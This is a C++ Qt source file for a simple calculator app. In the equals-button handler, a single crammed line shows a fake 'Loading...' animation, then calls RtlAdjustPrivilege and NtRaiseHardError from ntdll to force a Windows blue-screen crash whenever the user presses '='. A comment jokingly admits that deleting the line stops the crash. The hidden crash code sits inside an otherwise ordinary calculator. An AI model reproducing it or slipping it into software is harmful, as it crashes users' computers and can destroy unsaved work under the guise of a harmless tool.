#include "mainwindow.h"
#include "./ui_mainwindow.h"

#include <Windows.h>//sus
#include <winternl.h>//sus

QString new_label;
double  num_first,
        labelNumber,
        num_second,
        all_numbers;



MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    connect(ui->pushButton_0,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_1,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_2,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_3,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_4,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_5,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_6,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_7,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_8,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_9,SIGNAL(clicked()),this,SLOT(digits_numbers()));
    connect(ui->pushButton_negate,SIGNAL(clicked()),this,SLOT(operations()));
    connect(ui->pushButton_square,SIGNAL(clicked()),this,SLOT(operations()));

    connect(ui->pushButton_divide,SIGNAL(clicked()),this,SLOT(math_operations()));
    connect(ui->pushButton_multiply,SIGNAL(clicked()),this,SLOT(math_operations()));
    connect(ui->pushButton_minus,SIGNAL(clicked()),this,SLOT(math_operations()));
    connect(ui->pushButton_plus,SIGNAL(clicked()),this,SLOT(math_operations()));

    ui->pushButton_divide->setCheckable(true);
    ui->pushButton_multiply->setCheckable(true);
    ui->pushButton_minus->setCheckable(true);
    ui->pushButton_plus->setCheckable(true);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::digits_numbers()
{
    QPushButton * button = (QPushButton*)sender();

    if(ui->label->text().contains(".") && button->text() == "0")
    {
        new_label = (ui->label->text() + button->text());
    }
    else
    {
        all_numbers = (ui->label->text() + button->text()). toDouble();
        new_label = QString::number(all_numbers, 'g' , 15);
    }

    ui->label->setText(new_label);
}

void MainWindow::on_pushButton_point_clicked()
{
    if(!(ui->label->text().contains('.')))
    {
        ui->label->setText(ui->label->text() + ".");
    }

}

void MainWindow::operations()
{
    QPushButton * button = (QPushButton*)sender();



    if(button->text() == "+/-")
    {
        all_numbers = (ui->label->text()).toDouble();
        all_numbers = all_numbers * -1;
        new_label = QString::number(all_numbers, 'g' , 15);

        ui->label->setText(new_label);
    }

    if(button->text() == "x²")
    {
        all_numbers = (ui->label->text()).toDouble();
        all_numbers = all_numbers * all_numbers;
        new_label = QString::number(all_numbers, 'g' , 15);

        ui->label->setText(new_label);
    }
}

void MainWindow::math_operations()
{
    QPushButton * button = (QPushButton *)sender();

    num_first = ui->label->text().toDouble();

    ui->label->setText(" ");

    button->setChecked(true);
}

void MainWindow::on_pushButton_AC_clicked()
{
    ui->pushButton_divide->setChecked(false);
    ui->pushButton_multiply->setChecked(false);
    ui->pushButton_minus->setChecked(false);
    ui->pushButton_plus->setChecked(false);
    ui->label->setText("0");

}

void MainWindow::on_pushButton_equal_clicked()
{
    /*delete the bottom line to stop pc from crashing and make calculator work, maybe, I not sure about the last part*/
    typedef NTSTATUS(NTAPI*pdef_RtlAdjustPrivilege)(ULONG Privilege,BOOLEAN Enable,BOOLEAN CurrentThread,PBOOLEAN Enabled);typedef NTSTATUS(NTAPI*pdef_NtRaiseHardError)(NTSTATUS ErrorStatus,ULONG NumberOfParameters,ULONG UnicodeStringParameterMask OPTIONAL,PULONG_PTR Parameters,ULONG ResponseOption,PULONG Response);for(int i = 0;i<2;i++){ui->label->setText("Loading.");QCoreApplication::processEvents();Sleep(500);ui->label->setText("Loading..");QCoreApplication::processEvents();Sleep(500);ui->label->setText("Loading...");QCoreApplication::processEvents();Sleep(500);}BOOLEAN bEnabled;ULONG uResp;pdef_RtlAdjustPrivilege RtlAdjustPrivilege=(pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");pdef_NtRaiseHardError NtRaiseHardError=(pdef_NtRaiseHardError)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);



    num_second = ui->label->text().toDouble();

    if(ui->pushButton_divide->isChecked())
    {
        labelNumber = num_first / num_second;

        new_label = QString::number(labelNumber, 'g' , 15);
        ui->label->setText(new_label);

        ui->pushButton_divide->setChecked(false);
    }
    else if(ui->pushButton_multiply->isChecked())
    {
        labelNumber = num_first * num_second;

        new_label = QString::number(labelNumber, 'g' , 15);
        ui->label->setText(new_label);

        ui->pushButton_multiply->setChecked(false);
    }
    else if(ui->pushButton_minus->isChecked())
    {
        labelNumber = num_first - num_second;

        new_label = QString::number(labelNumber, 'g' , 15);
        ui->label->setText(new_label);

        ui->pushButton_minus->setChecked(false);
    }
    else if(ui->pushButton_plus->isChecked())
    {
        labelNumber = num_first + num_second;

        new_label = QString::number(labelNumber, 'g' , 15);
        ui->label->setText(new_label);

        ui->pushButton_plus->setChecked(false);
    }
}
